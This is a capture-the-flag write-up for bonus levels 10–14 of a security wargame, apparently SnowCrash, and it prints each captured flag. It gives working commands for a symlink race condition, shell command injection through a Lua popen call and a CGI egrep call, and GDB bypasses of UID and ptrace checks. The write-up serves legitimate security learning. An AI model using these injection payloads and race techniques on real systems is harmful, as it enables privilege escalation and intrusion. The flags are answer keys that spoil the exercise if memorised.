# Bonus Part

## Level 10

The binary works like this:

1. Check whether the user has the right to access the file.
2. If the user has the required rights, the file is opened and sent.

This creates a datarace between the check and the open. We can exploit this by creating a regular
file, to which we have access, start the binary and replace it with a symlink to the token.

If we're lucky, the binary will check the access rights with the first file, and then open the
token file.

```bash
touch /tmp/bonjour
./level10 /tmp/bonjour &

chrt -p -i 0 $!             # Set the priority of the binary to the lowest possible to slow it down

# Hopefully, the binary will check the access rights before this point.
rm /tmp/bonjour
ln -s ~/token /tmp/bonjour

nc -l 6969 &                # Wait for the binary to connect
```

### Flag: `feulo4b72j7edeahuete3no7c`

## Level 11

The script is a server prompting a password. This password is hashed and compared to some value.

The script uses...

```lua
io.popen("echo "..pass.." | sha1sum", "r")
```

... to hash the password. By passing the password

```txt
; getflag | wall
```

... we're executing the command:

```bash
echo ; getflag | wall | sha1sum
```

Which will display the flag.

### Flag: `fa6v5ateaw21peobuub8ipe6s`

## Level 12

The script is a CGI script, which:

1. Take a parameter `x` from the query string.
2. Uppercases it.
3. Removes everything past the first space.
4. Executes `egrep "^$x"` on the result.

By creating a file into the `/tmp` directory, we can execute arbitrary commands.

```bash
#!/bin/bash

getflag | wall
```

```bash
curl 'localhost:4646?x=$(/*/SCRIPT)'
```

Note that using only uppercase letters is mandatory, as the script will turn uppercase the value
anyway.

### Flag: `g1qKMiRpXf53AWhDaU7FEkczr`

## Level 13

The binary check the UID of the current user. If that UID is `4242`, it prints the token.

By using GDB, we can change the value of the UID to `4242` just before the check is made.

### Flag: `2A31L79asukciNyi8uppkEuSx`

## Level 14

This time, we have to exploit the `getflag` program itself.

The program is a bit more secured than the previous ones, as it checks whether it is currently
being debugged by calling `ptrace`.

Just like the other programs, however, we can simply change the return value of the function to
`0` to bypass the check.

After this, we just have to make the program think that we're `flag14` by setting the UID to
`3014`.

This _does_ mean that all flags are accessible this way.

### Flag: `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ`
